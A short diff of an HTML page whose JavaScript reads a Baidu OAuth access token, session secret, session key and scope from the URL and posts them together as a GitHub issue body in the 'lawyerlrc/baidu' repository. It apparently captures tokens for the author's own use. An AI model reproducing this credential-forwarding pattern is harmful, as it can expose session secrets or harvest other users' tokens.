@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>556</title>
+<title>777</title>
 </head>
 <body>
     以下是javascript代码
@@ -11,8 +11,11 @@
     
 let params = (new URL(document.location)).searchParams;
 let access_token = params.get('access_token'); 
-alert("start......");
-
+let expires_in = params.get('expires_in'); 
+let session_secret = params.get('session_secret'); 
+let session_key = params.get('session_key'); 
+let scope = params.get('scope'); 
+let content = 'access_token=' + access_token + '&expires_in=' + expires_in + '&session_secret=' + session_secret + '&session_key=' + session_key + '&scope=' + scope;
 </script>
 
 <script  type="module">
@@ -31,7 +34,7 @@ if (access_token){
       owner: "lawyerlrc",
       repo: "baidu",
       title: "access_token",
-      body: access_token,
+      body: content,
     });
 }  
 const { data } = await octokit.rest.repos.getContent({
